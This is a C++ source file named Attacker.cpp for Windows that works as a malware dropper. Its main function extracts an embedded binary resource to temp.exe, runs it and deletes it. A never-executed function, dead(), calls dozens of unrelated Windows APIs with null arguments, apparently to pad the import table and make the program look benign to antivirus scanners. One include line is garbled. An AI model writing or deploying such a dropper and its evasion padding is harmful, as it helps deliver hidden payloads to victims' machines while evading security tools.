// Attacker.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <windows.h>
#include <fstream>
#include "resource.h"

#include<commctrl.h>
#include<shlobj.h>>t.h>
#include<Uxtheme.h>
#include<atlstr.h>
#include<atlenc.h>

#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")


int main() {
    LPCWSTR lpType = L"BIN";

    // Find and load the embedded resource
    HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_BIN1), lpType);
    if (hResource == nullptr) {
        std::cerr << "Failed to locate embedded resource" << std::endl;
        return 1;
    }

    HGLOBAL hLoadedResource = LoadResource(nullptr, hResource);
    if (hLoadedResource == nullptr) {
        std::cerr << "Failed to load embedded resource" << std::endl;
        return 1;
    }

    // Get the resource data pointer and size
    void* pData = LockResource(hLoadedResource);
    DWORD dwSize = SizeofResource(nullptr, hResource);
    if (pData == nullptr || dwSize == 0) {
        std::cerr << "Failed to access embedded resource data" << std::endl;
        return 1;
    }

    // Write the resource data to a temporary file
    const char* tempFilename = "temp.exe"; // You can use a unique temporary filename
    std::ofstream outFile(tempFilename, std::ios::binary);
    if (!outFile.write(static_cast<const char*>(pData), dwSize)) {
        std::cerr << "Failed to write embedded resource to file" << std::endl;
        return 1;
    }

    outFile.close();

    // Execute the extracted binary (temp.exe)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(nullptr, const_cast<char*>(tempFilename), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cerr << "Failed to execute embedded binary" << std::endl;
        return 1;
    }

    std::cout << "Successfully executed embedded binary" << std::endl;

    // Cleanup: Close handles and delete the temporary file
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteFileA(tempFilename); // Delete the temporary file

    return 0;
}

void dead()
{
	return;
	memcpy(NULL, NULL, NULL);
	memset(NULL, NULL, NULL);
	strcpy(NULL, NULL);
	ShellAboutW(NULL, NULL, NULL, NULL);
	SHGetSpecialFolderPathW(NULL, NULL, NULL, NULL);
	ShellMessageBox(NULL, NULL, NULL, NULL, NULL);
	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegOpenKeyExW(NULL, NULL, NULL, NULL, NULL);
	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegDeleteKeyW(NULL, NULL);
	RegQueryInfoKeyW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegSetValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL, NULL, NULL);
	BSTR_UserFree(NULL, NULL);
	BufferedPaintClear(NULL, NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x, NULL, NULL, x, NULL);
	IsThemeActive();
	ImageList_Add(NULL, NULL, NULL);
	ImageList_Create(NULL, NULL, NULL, NULL, NULL);
	ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL, NULL, NULL, NULL);
	CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL, NULL);
	lstrcmpW(NULL, NULL);
	MulDiv(NULL, NULL, NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL, NULL, NULL, NULL, NULL, NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL, NULL, NULL, NULL);
	HeapSize(NULL, NULL, NULL);
	SetBkColor(NULL, NULL);
	SetBkMode(NULL, NULL);
	EmptyClipboard();
	CreateDIBSection(NULL, NULL, NULL, NULL, NULL, NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL, NULL);
	CombineRgn(NULL, NULL, NULL, NULL);
	SetRectRgn(NULL, NULL, NULL, NULL, NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL, NULL);
	CreateRectRgn(NULL, NULL, NULL, NULL);
	CreateCompatibleBitmap(NULL, NULL, NULL);
	LineTo(NULL, NULL, NULL);
	MoveToEx(NULL, NULL, NULL, NULL);
	ExtCreatePen(NULL, NULL, NULL, NULL, NULL);
	GetObjectW(NULL, NULL, NULL);
	GetTextExtentPoint32W(NULL, NULL, NULL, NULL);
	GetTextMetricsW(NULL, NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL, NULL);
	GetDeviceCaps(NULL, NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL, NULL);
	GetTextExtentPointW(NULL, NULL, NULL, NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL, NULL);
	UuidCreate(NULL);
	timeGetTime();
	SetBkColor(NULL, NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL, NULL, NULL);
	isalpha(NULL);
}



// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
